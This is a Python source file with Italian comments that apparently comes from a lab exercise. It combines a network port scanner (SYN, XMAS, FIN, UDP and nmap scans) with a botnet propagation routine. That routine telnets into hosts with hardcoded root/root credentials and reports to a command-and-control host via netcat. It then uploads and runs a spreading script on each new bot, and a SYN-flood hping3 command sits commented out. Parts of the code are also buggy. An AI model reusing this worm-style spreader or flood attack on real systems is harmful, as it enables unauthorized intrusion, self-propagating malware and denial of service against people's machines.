#Codice per effettuare SYN Scan: Quali servizi sono in ascolto?

from unittest import result
from scapy.all import *
from scapy.all import IP
from scapy.all import TCP
from scapy.all import UDP
from scapy.all import ICMP
from scapy import all as scapy
import time
import socket
import os
import sys
import random
import nmap
#import tqdm

#Librerie per telnet
import getpass
import telnetlib

import pyfiglet #TOOL PER SCRITTURA ASCII-ART

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Disable the annoying No Route found warning !


#PRIMA FASE: verifico gli host sulla mia rete.

#FUNCTION: INVIO IP PERSONALE, PER RICONOSCERE LA MASCHERA 
def obtain_personal_IP():
    
    booleanToReturn = False

    personalIP = input("Inserisci il tuo IP personale ")
    if personalIP.count(".") >0:
        booleanToReturn = True

    print("Il tuo IP é: " +personalIP)
    ipInput = personalIP.split(".")
    return ipInput, booleanToReturn


#FUNCTION: VERIFICA GLI IP CONNESSI ALLA RETE
def isAlivePing(file, ipInput): 
    #for x in range(1,254):
    for x in range(1,20):
       # per ognuno di questi devo effettuare verifiche per vedere se vi sono host attivi
        ret = os.system("ping -c 1 -W 3 " +str(ipInput[0]) +"." +str(ipInput[1]) +"." +str(ipInput[2]) +"." +str(x) + " > /dev/null") #non stampo a video
        
        if ret == 0: #PING RITORNA UN VALORE DIVERSO DA ZERO SE LA CONNESSIONE FALLISCE
            
            print("pc still alive")
            file.write(str(ipInput[0]) +"." +str(ipInput[1]) +"." +str(ipInput[2]) +"." +str(x) +"\n") #scrivo l'IP del pc "vivo" sulla rete

        #else:
            #print("pc not alive")

    

#TCP Syn Scan

def SynScan(fileRead):

    to_reset = []
    results = []

    dictionary = [22,23,111,135,139,445,2049,2323]
 
    file = open("SynScan.txt","w")

    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        IPlineRead = line.rstrip()
        print("SYN SCAN primo IP: " +IPlineRead)

        #for x in range(1,1024): #verifico tutte le porte.
        for x in dictionary:

            #results = {port:None for port in x}
            # Forgiare SYN packet
            packetToSendSyn = IP(dst=IPlineRead)/TCP(dport=x, flags='S')  
            
            # Invio del pacchetto  -> dalla documentazione: Returns ( (matched couples), (unmatched packets) )
            answers, un_answered = sr(packetToSendSyn, timeout=0.2, verbose=0)  

            for req, resp in answers:

                if not resp.haslayer(TCP): #Se non ha layer TCP la porta, continua.  -> si può usare anche TCP in x
                    continue               # Vado avanti con il for, direttamente.

                tcp_layer = resp.getlayer(TCP) #Se ha il layer TCP, lo otteniamo con una get -> si può usare anche x[TCP] (credo)

                if tcp_layer.flags == 0x12:     #0x12 = 10010  -> ovvero: ACK = 1 - PSH=0 - RST=0 - SYN =1 - FIN =0   -> messaggio atteso!! La porta è viva
                    to_reset.append(tcp_layer.sport)  #sport = source_port 
                    results.append(True)
                    file.write(IPlineRead +"-" +str(tcp_layer.sport) +"\n") #Scrivo su file IP '-' porta aperta
                    #results[tcp_layer.sport] = True

                elif tcp_layer.flags == 0x14:   #0x14 = 10100  -> ovvero: ACK = 1 - PSH=0 - RST=1 - SYN =0 - FIN =0   -> messaggio che indica: servizio assente sulla porta 
                    results.append(False)
                    #results[tcp_layer.sport] = False

            resetConnection(IPlineRead, to_reset) #Nel caso in cui ho ricevuto un ACK e SYN, allora devo fare il reset della connessione

            #results = isOpen(int(lineRead),x) 
            #print(results)  -> Stampo la lista di true e false ricevute

    fileRead.seek(0) #Reimposto a 0 la testina di lettura 


    
    
    

#TCP XMAS TREE SCAN
def XMASTreeScan(fileRead):
    
    to_reset = []
    results = []
    
    dictionary = [22,23,111,135,139,445,2049,2323]

    file = open("XMASTreeScan.txt","w")

    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        IPlineRead = line.rstrip()
        print("XMAS Tree SCAN - IP: " +IPlineRead)

        #for x in range(1,1024): #verifico tutte le porte.
        for x in dictionary:

            # Forgiare SYN packet
            packetToSendSyn = IP(dst=IPlineRead)/TCP(dport=x, flags='UPF')   #Alcuni lo implementano con "UFP"
            
            # Invio del pacchetto  -> dalla documentazione: Returns ( (matched couples), (unmatched packets) )
            answers, un_answered = sr(packetToSendSyn, timeout=0.2, verbose=0)  

            for resp in un_answered:
                if (resp.haslayer(TCP)):
                    file.write(IPlineRead +"-" +str(x) +"\n") #Scrivo su file IP '-' porta aperta

            for req, resp in answers: #Quando il pacchetto non ha alcun layer -> no risposta, non entra in questo ciclo 
         
                if not resp.haslayer(TCP): #Se non ha layer TCP la risposta, continua.  -> si può usare anche "TCP in x"
                    continue               # Vado avanti con il for, direttamente.

                tcp_layer = resp.getlayer(TCP) #Se ha il layer TCP, lo otteniamo con una get -> si può usare anche x[TCP] (credo)

                if tcp_layer.flags >= 0x4:     #0x4 = 000100  -> ovvero: URG =0 ACK = 0 - PSH=0 - RST=1 - SYN =0 - FIN =0   -> Se reset è zero: porta chiusa
                    to_reset.append(tcp_layer.sport)  #sport = source_port 
                    results.append(False)
                    #results[tcp_layer.sport] = True
                
                elif (resp.haslayer(ICMP) and int(resp.getlayer[ICMP].type) == 3 and int(resp.getlayer[ICMP]) in [1,2,3,9,10,13]): #Se rientra in questi è filtrato sicuramente.
                    print("filtered")
                
                                                        
                    
            resetConnection(IPlineRead, to_reset) #Nel caso in cui ho ricevuto un ACK e SYN, allora devo fare il reset della connessione

            #results = isOpen(int(lineRead),x) 
            #print(results)  -> Stampo la lista di true e false ricevute

    fileRead.seek(0) #Reimposto a 0 la testina di lettura 

#TCP FIN SCAN
def TCPFinScan(fileRead):

    
    to_reset = []
    results = []

    dictionary = [22,23,111,135,139,445,2049,2323]

    file = open("TCPFinScan.txt","w")

    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        IPlineRead = line.rstrip()
        print("TCP FIN SCAN - IP: " +IPlineRead)

        #for x in range(1,1024): #verifico tutte le porte.
        for x in dictionary:

            #results = {port:None for port in x}
            # Forgiare SYN packet
            packetToSendSyn = IP(dst=IPlineRead)/TCP(dport=x, flags='F')   #Alcuni lo implementano con "UFP"
            
            # Invio del pacchetto  -> dalla documentazione: Returns ( (matched couples), (unmatched packets) )
            answers, un_answered = sr(packetToSendSyn, timeout=0.2, verbose=False)  

            for resp in un_answered:
                if (resp.haslayer(TCP)):
                    file.write(IPlineRead +"-" +str(x) +"\n") #Scrivo su file IP '-' porta aperta

            for req, resp in answers:

                if not resp.haslayer(TCP): #Se non ha layer TCP la porta, continua.  -> si può usare anche TCP in x
                    continue               # Vado avanti con il for, direttamente.               

                elif (resp.haslayer(TCP)): #Se ha il layer TCP, lo otteniamo con una get -> si può usare anche x[TCP] (credo)
                    tcp_layer = resp.getlayer(TCP)
                    if tcp_layer.flags >= 0x4:     #0x4 = 000100  -> ovvero: URG =0 ACK = 0 - PSH=0 - RST=1 - SYN =0 - FIN =0   -> messaggio atteso!! La porta è viva
                        to_reset.append(tcp_layer.sport)  #sport = source_port 
                        results.append(False)
                        #results[tcp_layer.sport] = True

                    elif (resp.haslayer(ICMP)): #Se rientra in questi è filtrato sicuramente.
                        if int(resp.getlayer[scapy.ICMP].type) == 3 and int(resp.getlayer[scapy.ICMP].code) in [1,2,3,9,10,13]:
                            print("IP: " +IPlineRead +" Port: " +x +" filtered" ) 
                
                        else:
                            file.write(IPlineRead +"-" +str(tcp_layer.sport) +"\n") #Scrivo su file IP '-' porta aperta
                

            resetConnection(IPlineRead, to_reset) #Nel caso in cui ho ricevuto un ACK e SYN, allora devo fare il reset della connessione

            #results = isOpen(int(lineRead),x) 
            #print(results)  -> Stampo la lista di true e false ricevute

    fileRead.seek(0) #Reimposto a 0 la testina di lettura 

#UDP Scan

def scannerUDP(target,port):
    #source_port = scapy.RandShort() NON FUNZIONA, MA DOVREBBE
    source_port = 3026
    ip_scan_packet = scapy.IP(dst=target)
    udp_scan_packet = scapy.UDP(sport = source_port, dport = port)
    scan_packet = ip_scan_packet/udp_scan_packet
    scan_response = scapy.sr1(scan_packet, timeout=1, verbose=False)

    if(scan_response != None):
        if scan_response.haslayer(scapy.UDP):
            print("Open")
            return "Open"
        elif int(scan_response[scapy.ICMP].type) == 3 and int(scan_response[scapy.ICMP].code) == 3:
            print("Closed")
            return "Closed"
        elif int(scan_response[scapy.ICMP].type) == 3 and int(scan_response[scapy.ICMP].code) in [1,2,9,10,13]:
            print("Filtered")
            return "Filtered"
    else:
        print("Opened or Filtered")
        return "Opened or Filtered" 


def UDPScan(fileRead):

    file = open("UDPScan.txt","w")
    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        IPlineRead = line.rstrip() #LEGGO L'INDIRIZZO IP
        print("UDP SCAN - IP: " +IPlineRead)

        #dictionary = [22,23,111,135,139,445,2049,2323]
        dictionary = []
        dictionary = [23,500,111,123, 135, 445, 2049, 2323, 161,1434,6502,69,523,1604,7,19,11,13,53,137,177,5405,5353,2123]

        #for x in range(1,1024): #verifico tutte le porte.
        for x in dictionary:
            res = scannerUDP(IPlineRead,x) #Chiamo la funzione per l'IP e per ogni porta da 1 a 1024

            if (res == "Open") or (res== "Opened or Filtered"):
                file.write(IPlineRead +"-" +str(x) +" " +res +"\n") #Scrivo su file IP '-' porta aperta

    fileRead.seek(0)



def NMAPscan(fileRead):
    file = open("nmapResults.txt","a")
    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        lineRead = line.rstrip()
        print(lineRead)
        #splittedIP = lineRead.split(".")
        #StringIP = str(splittedIP[0]) +"." + str(splittedIP[1]) +"." +str(splittedIP[2]) +"." +str(random.randint(1,253))
        #CommandToSend = "nmap -sS" +lineRead + "-D" + StringIP + "-oX nmapFile.xml"
        nmScan = nmap.PortScanner()
        nmScan.scan(lineRead, '1-2323')
        nmScan.command_line()
        file.write(nmScan.csv())
        file.write("\n\n")



    fileRead.seek(0)

def resetConnection(ip, ports):
    # Resetta la connessione per stoppare le connessioni mezze aperte - Reset the connection to stop half-open connections from pooling up
    sr(IP(dst=ip)/TCP(dport=ports, flags='AR'), timeout=1)


def isOpen(ip, ports, timeout=0.2):

    results = {port:None for port in ports}
    to_reset = []

    packetToSendSyn = IP(dst=ip)/TCP(dport=ports, flags='S')  # Forgiare SYN packet
    answers, un_answered = sr(packetToSendSyn, timeout=timeout)  # Invio del pacchetto  -> dalla documentazione: Returns ( (matched couples), (unmatched packets) )

    for req, resp in answers:

        if not resp.haslayer(TCP): #Se non ha layer TCP la porta, continua.  -> si può usare anche TCP in x
            continue               # Vado avanti con il for, direttamente.

        tcp_layer = resp.getlayer(TCP) #Se ha il layer TCP, lo otteniamo con una get -> si può usare anche x[TCP] (credo)

        if tcp_layer.flags == 0x12:     #0x12 = 10010  -> ovvero: ACK = 1 - PSH=0 - RST=0 - SYN =1 - FIN =0   -> messaggio atteso!! La porta è viva
            to_reset.append(tcp_layer.sport)  #sport = source_port 
            print("Ricevuto un ACK=SYN = 1")
            results[tcp_layer.sport] = True

        elif tcp_layer.flags == 0x14:   #0x14 = 10100  -> ovvero: ACK = 1 - PSH=0 - RST=1 - SYN =0 - FIN =0   -> messaggio che indica: servizio assente sulla porta 
            results[tcp_layer.sport] = False

    resetConnection(ip, to_reset) #Nel caso in cui ho ricevuto un ACK e SYN, allora devo fare il reset della connessione
    return results

def OSDetection():
    ipTemp =0

    fileDictionary = {
        1 : 'SynScan.txt',
        2 : 'XMASTreeScan.txt',
        3 : 'TCPFinScan.txt',
        4 : 'UDPScan.txt'
    }

    portDictionary = {
        22 : 'SSH',
        111: 'SUN RPC',
        135: 'MSRPC: endpoint mapper',
        139: 'netBIOS',
        445: 'Microsoft ds active Directory',
        2049: 'NFS',
    }

    print(fileDictionary)
    selected1 = input("Inserisci quale file utilizzare in input: ")
    print("Stiamo utilizzando il file di input: " +selected1)
    print(fileDictionary[1])

    fileNameToOpen = fileDictionary[1]
    fileRead = open (fileNameToOpen,'r')
    fileWrite = open("OS_Detection.txt",'a')


    for line in fileRead:  #leggo tutte le righe del file e per ogni riga 
        lineRead = line.rstrip()
        ipPort = lineRead.split("-") #ottengo IP-PORT

        ipAddress = ipPort[0]
        port = int(ipPort[1])

        if(int(ipPort[1])==135) or (int(ipPort[1])==139) or (int(ipPort[1]) ==445):
            if(ipAddress != ipTemp):
                fileWrite.write("\n" +ipAddress + " Windows \n porte aperte:" + portDictionary[port])
                ipTemp = ipAddress
            else:
                fileWrite.write(" - " + portDictionary[port])

        elif(int(ipPort[1])==22) or(int(ipPort[1])==111) or (int(ipPort[1]) ==2049):
            if(ipAddress != ipTemp):
                fileWrite.write("\n" +ipAddress + " UNIX  :" + portDictionary[port] +"\n")
                ipTemp = ipAddress
            else:
                fileWrite.write(" - " + portDictionary[port] +"\n")


#Thread in ascolto


def socketSend(ip, port, fileNameToSend):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    client.settimeout(5)
    fileToSend = open(fileNameToSend,'rb+')
    print("Loading " +fileNameToSend +"....")
    data = fileToSend.read()

    print("Sending " +fileNameToSend +"....")
    client.sendfile(fileToSend)
    #client.send(data)
    
    fileToSend.close()
    print("DONE SENDING")
    client.close()




#MAIN FUNCTION

def main():
    
    toPrint = pyfiglet.figlet_format("FM\nIP and PORT\nSCANNER")
    print(toPrint)

    ipInput,isIp = obtain_personal_IP()
    fileIpAlive = "IPalive.txt"

    if isIp:
        print("Effettuo un controllo sugli IP vivi")
        file = open(fileIpAlive,"a")
        isAlivePing(file,ipInput)
        file.close()

    while True:

        selected = input("\n\tComandi:\n1) SYN scan\n2) TCPXMASTREE scan\n3) TCP FIN scan\n4) UDP scan\n5) Scan con nmap\n6) Exit\n 7) OS Detection from data\n\nDigita: ")

        if (int(selected) <= 5):
            fileRead = open("IPalive.txt","r") #Apertura file in lettura
        if (int(selected) == 1):
            print("Hai scelto: SYN SCAN")
            SynScan(fileRead)
        elif (int(selected) == 2):
            print("Hai scelto: TCPXMASTREE SCAN")
            XMASTreeScan(fileRead)

        elif (int(selected) == 3):
            print("Hai scelto: FIN SCAN")
            TCPFinScan(fileRead)
        elif (int(selected) == 4):
            print("Hai scelto: UDP SCAN")
            UDPScan(fileRead)
        elif (int(selected) == 5):
            print("Hai scelto: SCAN con nmap")
            NMAPscan(fileRead)
        elif (int(selected) ==6):
            print("CHIUSURA")
            break
        
        elif(int(selected) ==7):
            toPrint2 = pyfiglet.figlet_format("OS Detection")
            print(toPrint2)
            selected2 = input("\n\tComandi:\n1) From data\n2) nmap detection\n\nDigita: ")
            OSDetection()

            if (int(selected2) == 1):
                print("OS DETECTION FROM DATA")
            elif (int(selected2) == 2):
                print("OS DETECTION NMAP")
            else:
                print("Close")
                break

#FINITO IL WHILE TRUE, QUINDI CON LA CHIUSURA CLICCANDO SU 6, ALLORA POSSO:

    HOST = "172.16.0.12" #come semplificazione: il primo bot: bot1 lo inserisco direttamente 
    PORTtoOpen = 4000
    cncPort = 4999
    fileNameToSend = "pyscript.py"
    user = "root"
    password = "root"

    tn = telnetlib.Telnet(HOST,23)
    tn.read_until(b"login: ")
    tn.write(user.encode('ascii') + b"\n")

    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")


    #A questo punto dovremmo essere entrati nel bot. 
    #commandToSend = "sudo apt install hping3 -y"

    stringToSend = '"' + HOST +'\\n"'
    commandToSend = 'echo -e -n ' + stringToSend +' | nc -w 2 172.16.0.3 1025'                 #IP del cnc 172.16.0.3, impostare IP statico
    commandToSend2 = "nc -l -p " +str(PORTtoOpen) +" > " +fileNameToSend  #Apre la porta per ricevere l'attacco da parte dello scanner.

    commandToSend3 = "nc -l -p " +str(PORTtoOpen) +" > " +fileIpAlive        #Apre la porta per ricevere l'attacco da parte dello scanner.
    commandToSend4 = "sudo hping3 -S --flood -V -p 80 172.18.0.4"           #Effettua l'attacco con hping 
    
    tn.write(commandToSend.encode('ascii'))
    tn.write(b"\n")  

    time.sleep(2)
    #Ora ci mettiamo in ascolto alla porta 4000 con netcat e ad ogni nuova ricezione, ci occupiamo di caricare l'attacco alla porta aperta del bot
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #scannerIP = '172.16.0.4' #DA USARE
    scannerIP = '172.16.0.1'  #TEST
    s.bind((scannerIP, cncPort))
    print("bind OK")
    s.listen(10)                                                #si mette in ascolto di 10 connessioni -> SEMPLIFICAZIONE
    print("...listening for 10-max connections")
    counterIPALIVE = 1

    while True: 
        #accetto la connessione con il client
        client,address = s.accept()
        print("Connected to", address)

        IPreceived = client.recv(1024).decode('utf-8')          #ricevo l'IP dal CNC
        IPreceived = IPreceived[:-1]
        print("Received: "  +IPreceived)                        #Stampo l'IP ricevuto dal CNC

        #Ogni volta che ricevo un IP devo caricare il file pyscript.py sul bot e avviarlo.
        if (IPreceived != "172.16.0.12"):
            tn.close()                              #Close older connection
            print("New address")
            tn = telnetlib.Telnet(IPreceived,23)    #Open new connection
            print(tn.read_until(b"login: "))
            tn.write(user.encode('ascii') + b"\n")

            if password:
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")          #userò come password e user sempre root-root
                time.sleep(2)
              
            
        print("Connection to: " +IPreceived +" DONE")

        #Ho effettuato la connessione al secondo bot, ora effettuo il caricamento dello script. 
        tn.write(commandToSend2.encode('ascii') +b"\n")
        time.sleep(2)

        #socketSend(IPreceived, PORTtoOpen,fileNameToSend)               #Uso la funzione per invio del file
        command = "nc -w 2" +" "+IPreceived +" "+str(PORTtoOpen) + " < " +fileNameToSend
        #print(command)
        subprocess.call(command, shell=True)
        
        #print(fileNameToSend + " inviato")

        tn.write(commandToSend3.encode('ascii') + b"\n")                #Metto il bot in ascolto sulla porta 4000 per ricevere IPalive.txt)
        time.sleep(2)
        command2 = "nc -w 2" +" "+IPreceived +" "+str(PORTtoOpen) + " < " +fileIpAlive
        subprocess.call(command2, shell=True)
        #socketSend(IPreceived, PORTtoOpen,"IPalive.txt")                #Uso la funzione per invio del file
        #print("IPalive.txt inviato")

        commandToExecute = "python3 " +fileNameToSend +" " +str(counterIPALIVE) +" "
        tn.write(commandToExecute.encode('ascii') + b"\n")              #mando in run il file python per trovare nuovi bot da attaccare 
        time.sleep(2)
        #tn.write(commandToSend4.encode('ascii') + b"\n")                #Attacco con Hping3 -> supponiamo che sia già installato sulle macchine.

        #subprocess.call(" echo ...hping in execution to victim machine...", shell=True)
        #counterIPALIVE = counterIPALIVE +1
        #print(counterIPALIVE)
        tn.close()
        print("waiting to new bot...")
    

if __name__ == "__main__":
    main()


    








    

    #Procedo ad inviare lo script python da eseguire:

    #SEPARATOR = "<SEPARATOR>"
    #fileNameToSend = "pyscript.py"
    #fileSize = os.path.getsize(fileNameToSend) #Ottengo la dimensione del file per l'invio
    #socketHacked = socket.socket()
    #print(f"[+] Connecting to {HOST}:{PORTtoOpen}")
    #socketHacked.connect((HOST,PORTtoOpen))
    #print("[+] Connected.")
    #socketHacked.send(f"{fileNameToSend}{SEPARATOR}{fileSize}".encode())
    

